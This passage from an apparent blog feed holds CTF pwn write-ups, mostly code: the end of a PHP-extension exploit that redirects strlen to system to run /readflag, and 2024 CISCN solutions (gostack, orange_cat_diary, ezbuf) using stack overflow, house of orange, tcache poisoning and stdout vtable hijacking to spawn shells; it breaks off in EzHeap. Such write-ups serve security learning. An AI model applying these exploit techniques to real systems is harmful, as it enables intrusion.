\/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;<br>    <span class="hljs-variable">$p1</span> = <span class="hljs-string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/.*?numberGame.so/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$p</span>, <span class="hljs-variable">$buffer</span>, <span class="hljs-variable">$libc</span>);<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$p1</span>, <span class="hljs-variable">$buffer</span>, <span class="hljs-variable">$mbase</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">putdata</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$ind</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$num</span>: <span class="hljs-subst">$value</span>\n&quot;</span>;<br>        <span class="hljs-variable">$num</span>++;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$ind</span>,<span class="hljs-variable">$isout</span>=<span class="hljs-number">1</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">show_chunk</span>(<span class="hljs-variable">$ind</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isout</span>)<br>        <span class="hljs-title function_ invoke__">putdata</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"><span class="hljs-variable">$ind</span>,<span class="hljs-variable">$ind_</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">edit_chunk</span>(<span class="hljs-variable">$ind</span>,<span class="hljs-variable">$ind_</span>,<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ljust</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$len</span>,<span class="hljs-variable">$s</span>=<span class="hljs-string">&quot;a&quot;</span></span>)</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>&gt;=<span class="hljs-variable">$len</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(;<span class="hljs-variable">$a</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$a</span>++)&#123;<br>        <span class="hljs-variable">$data</span>.=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;leakaddr&quot;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>);<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-title function_ invoke__">leakaddr</span>(<span class="hljs-variable">$buffer</span>);<br><span class="hljs-variable">$libcbase</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$libc</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]);<br><span class="hljs-variable">$mobbase</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$mbase</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$libcbase</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$mobbase</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$strlen</span>=<span class="hljs-variable">$mobbase</span>+<span class="hljs-number">0x4008</span>;<br><span class="hljs-variable">$system</span>=<span class="hljs-variable">$libcbase</span>+<span class="hljs-number">312464</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$strlen</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">add_chunk</span>(<span class="hljs-number">43</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80000001</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-title function_ invoke__">add_chunk</span>(<span class="hljs-number">43</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-title function_ invoke__">add_chunk</span>(<span class="hljs-number">43</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],<span class="hljs-string">&quot;/readflag&quot;</span>);<br><span class="hljs-title function_ invoke__">show</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">edit_chunk</span>(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>,<span class="hljs-variable">$strlen</span>&amp;<span class="hljs-number">0xffffffff</span>);<br><span class="hljs-comment">#edit_chunk(0,51,($libcbase&gt;&gt;32)&amp;0xffffffff);</span><br><span class="hljs-title function_ invoke__">edit_name</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">p64</span>(<span class="hljs-variable">$system</span>,<span class="hljs-number">6</span>));<br><span class="hljs-title function_ invoke__">edit_name</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;asdf&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ciscn-pwn</title>
    <link href="/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/"/>
    <url>/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="gostack">gostack</h2><p>简单的栈溢出，只要控制数据后面的一个指针指向可读地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./gostack&quot;</span>)<br><span class="hljs-comment">#p=remote(&quot;8.147.133.9&quot;,&quot;39706&quot;)</span><br>e=ELF(<span class="hljs-string">&quot;./gostack&quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0x4C0995</span>)+p64(<span class="hljs-number">0x1c8</span>)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>+p64(<span class="hljs-number">0x4a0af6</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;message :&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="orange-cat-diary">orange_cat_diary</h2><p>一个简单的堆溢出，利用house of orange泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    pause()<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br>    pause()<br><br><br><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;8.147.131.196&quot;</span>,<span class="hljs-string">&quot;32607&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./orange_cat_diary&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;rotwill&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x1001</span>-<span class="hljs-number">0x70</span>)[:-<span class="hljs-number">1</span>])<br>add(<span class="hljs-number">0x1000</span>)<br>add(<span class="hljs-number">0x68</span>)<br>show()<br>p.readuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x3c510a</span><br>malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>gadget=libc.address+<span class="hljs-number">0xf03a4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>free()<br>edit(<span class="hljs-number">8</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(gadget))<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezbuf">ezbuf</h2><p>一个简单的堆溢出，不过使用了protobuf协议<br>比赛后半小时出的，太可惜了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br>num=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spbuf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> s:<br>        s=<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">else</span>:<br>        s=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x20&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spchr</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x28&#x27;</span>+varint.encode(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Data(data)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">none</span>():<br>    payload=Mode(<span class="hljs-number">0</span>)+Ind(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind,isbuf=<span class="hljs-number">0</span>,spchr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> num<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Spbuf(isbuf)+Spchr(spchr)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>        num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br>        pause<br>        <br>p=remote(<span class="hljs-string">&quot;8.147.134.47&quot;</span>,<span class="hljs-string">&quot;30129&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;0&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;testtest&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ac30</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>vtable=stdout+<span class="hljs-number">0xd0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(i+<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>chunk0=calc(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=: x&#125;</span>&quot;</span>)<br>free(<span class="hljs-number">7</span>)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>chunk6=chunk0+<span class="hljs-number">0x1d60</span><br>chunk7=chunk0+<span class="hljs-number">0x2020</span><br>obstack=p64(system)<br>obstack+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(chunk7+<span class="hljs-number">8</span>)<br><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64((chunk6&gt;&gt;<span class="hljs-number">12</span>)^(chunk7-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">6</span>,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk6=: x&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk7=: x&#125;</span>&quot;</span>)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">8</span>,p64((chunk7&gt;&gt;<span class="hljs-number">12</span>)^(chunk6)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0</span>,obstack)<br><br>free(<span class="hljs-number">6</span>)<br><br>pause()<br>add(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x40</span>)+p64(((chunk6+<span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">12</span>)^(vtable)))<br><br>payload1=p64(<span class="hljs-number">0</span>)+p64(obstack_jump)+p64(chunk7-<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">2</span>,payload1)<br>add(<span class="hljs-number">2</span>,payload1)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="EzHeap">EzHeap</h2><p>跟ezbuf的类似，只是开启了沙箱防护，由没有使用protobuf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span 